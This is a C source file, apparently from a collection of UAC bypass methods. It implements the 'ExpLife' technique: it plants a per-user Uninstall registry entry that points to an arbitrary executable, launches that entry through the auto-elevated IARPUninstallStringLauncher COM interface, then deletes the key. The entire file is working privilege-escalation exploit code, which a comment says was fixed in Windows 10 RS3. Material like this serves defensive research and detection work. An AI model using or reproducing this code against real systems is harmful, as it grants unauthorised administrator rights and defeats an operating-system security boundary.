/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2019
*
*  TITLE:       EXPLIFE.C
*
*  VERSION:     3.17
*
*  DATE:        18 Mar 2019
*
*  ExpLife UAC bypass using IARPUninstallStringLauncher.
*  For description please visit original URL
*  http://www.freebuf.com/articles/system/116611.html
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmMasqueradedAPRLaunchFile
*
* Purpose:
*
* Initialize interface and run required method.
*
*/
BOOL ucmMasqueradedAPRLaunchFile(
    _In_ LPWSTR lpszFileGuid
)
{
    HRESULT                      r = E_FAIL;
    IARPUninstallStringLauncher *USLauncher = NULL;

    r = ucmAllocateElevatedObject(
        T_CLSID_UninstallStringLauncher,
        &IID_IARPUninstallStringLauncher,
        CLSCTX_LOCAL_SERVER,
        &USLauncher);

    if ((SUCCEEDED(r)) && (USLauncher)) {

        r = USLauncher->lpVtbl->LaunchUninstallStringAndWait(
            USLauncher,
            0,
            lpszFileGuid,
            FALSE,
            NULL);

        USLauncher->lpVtbl->Release(USLauncher);
    }

    return SUCCEEDED(r);
}

/*
* ucmUninstallLauncherMethod
*
* Purpose:
*
* Bypass UAC using AutoElevated undocumented IARPUninstallStringLauncher interface.
*
* Fixed in Windows 10 RS3
*
*/
NTSTATUS ucmUninstallLauncherMethod(
    _In_ LPWSTR lpszExecutable
)
{
    NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
    HRESULT     hr_init;
    SIZE_T      cbData;
    HKEY        hKey = NULL;
    GUID        guid;
    WCHAR       szKeyName[MAX_PATH], szGuid[64];

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    if (CoCreateGuid(&guid) == S_OK) {

        _strcpy(szKeyName, T_UNINSTALL);
        if (StringFromGUID2(&guid, szGuid, sizeof(szGuid) / sizeof(WCHAR))) {

            _strcat(szKeyName, szGuid);
            if (ERROR_SUCCESS == RegCreateKeyEx(
                HKEY_CURRENT_USER,
                szKeyName,
                0,
                NULL,
                REG_OPTION_NON_VOLATILE,
                MAXIMUM_ALLOWED,
                NULL,
                &hKey,
                NULL))
            {
                cbData = (1 + _strlen(lpszExecutable)) * sizeof(WCHAR);
                if (ERROR_SUCCESS == RegSetValueEx(
                    hKey,
                    T_UNINSTALL_STRING,
                    0,
                    REG_SZ,
                    (BYTE*)lpszExecutable,
                    (DWORD)cbData))
                {
                    if (ucmMasqueradedAPRLaunchFile(szGuid))
                        MethodResult = STATUS_SUCCESS;
                }

                RegCloseKey(hKey);
                RegDeleteKey(HKEY_CURRENT_USER, szKeyName);
            }
        }
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}
